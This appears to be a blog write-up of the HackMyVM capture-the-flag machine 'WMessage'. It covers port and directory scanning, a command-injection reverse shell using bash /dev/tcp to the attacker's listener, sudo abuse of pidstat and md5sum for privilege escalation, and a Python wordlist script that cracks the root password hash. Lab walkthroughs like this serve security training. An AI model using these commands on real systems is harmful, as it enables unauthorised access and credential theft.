---
layout: post
title: "HackMyVM - WMessage"
date: 2022-12-20 15:47:00 +0100
categories: hmv
tag: ["Python"]
---

Creator: [WWFYMN](https://hackmyvm.eu/profile/?user=WWFYMN)
Level: Easy
Release Date: 2022-12-01

## Scan & Enumeration

```bash
$ nmap -sC -sV -oA nmap/Wmessage -p- 192.168.1.35
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-20 18:32 WET
Nmap scan report for 192.168.1.35
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 628e95581eee94d1560ee551f5453843 (RSA)
|   256 45a87e567fdfb083656c886819a4866c (ECDSA)
|_  256 bc5424a60a8b6d34dca6ab8098ee1ff7 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
| http-title: Login
|_Requested resource was /login?next=%2F
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.09 seconds
```

```bash
$ curl -s 192.168.1.35 -I
HTTP/1.1 302 FOUND
Date: Tue, 20 Dec 2022 14:32:51 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 217
Location: /login?next=%2F
Vary: Cookie
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX1dfQ.Y6HHkw.e0xts0eGQ0rTuPuUaj7gg4chPow; HttpOnly; Path=/
Content-Type: text/html; charset=utf-8
```

### GoBuster

```bash
$ gobuster dir -u http://192.168.1.35 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100 -x php,txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.35
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2022/12/20 18:35:16 Starting gobuster in directory enumeration mode
===============================================================
/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.35/javascript/]
/login                (Status: 200) [Size: 2472]
/manual               (Status: 301) [Size: 313] [--> http://192.168.1.35/manual/]
/user                 (Status: 302) [Size: 225] [--> /login?next=%2Fuser]
/sign-up              (Status: 200) [Size: 2843]
/server-status        (Status: 403) [Size: 277]
2022/12/20 18:38:11 Finished
===============================================================
```

## Reverse Shell

```
!mpstat | bash -c 'bash -i >& /dev/tcp/192.168.1.6/4444 0>&1'
```

```bash
$ nc -lvnp 4444                                                                                                                 
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.35] 59018
bash: cannot set terminal process group (312): Inappropriate ioctl for device
bash: no job control in this shell
www-data@MSG:/$id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@MSG:/$
```

## Lateral Movement [pidstat](https://gtfobins.github.io/gtfobins/pidstat/#sudo)

```bash
www-data@MSG:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on MSG:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on MSG:
    (messagemaster) NOPASSWD: /bin/pidstat
www-data@MSG:/$ 
```

```bash
sudo -u messagemaster /bin/pidstat -e /bin/bash -i
Linux 5.10.0-19-amd64 (MSG)     12/20/22        _x86_64_        (1 CPU)

23:48:50      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
23:48:50     1000       441    0.00    0.00    0.00    0.00    0.00     0  pidstat
www-data@MSG:/$ bash: cannot set terminal process group (312): Inappropriate ioctl for device
bash: no job control in this shell
messagemaster@MSG:/$ id
id
uid=1000(messagemaster) gid=1000(messagemaster) groups=1000(messagemaster),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth)
messagemaster@MSG:/$ 
```

## ROOT

```bash
messagemaster@MSG:/$ sudo -l
sudo -l
Matching Defaults entries for messagemaster on MSG:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User messagemaster may run the following commands on MSG:
    (ALL) NOPASSWD: /bin/md5sum
messagemaster@MSG:/$ 
```

```bash
messagemaster@MSG:/$ cd /var/www/
messagemaster@MSG:/var/www$ ls
ROOTPASS
html
messagemaster@MSG:/var/www$ sudo /bin/md5sum ROOTPASS
85c73111b30f9ede8504bb4a4b682f48  ROOTPASS
messagemaster@MSG:/var/www$
```

## Crack MD5 hash

```python

import hashlib

md5 = "85c73111b30f9ede8504bb4a4b682f48"

with open("/usr/share/wordlists/rockyou.txt", encoding="utf-8", errors="ignore") as wordlist:
	lines = wordlist.readlines()
	for passwd in lines:
		passwd = passwd.replace("\n", "")
		hash = hashlib.md5((passwd.strip() + "\n").encode()).hexdigest()
		if str(hash) == md5:
			print(passwd)
			
```

```bash 
$ python3 script.py                                           
Message5687
```

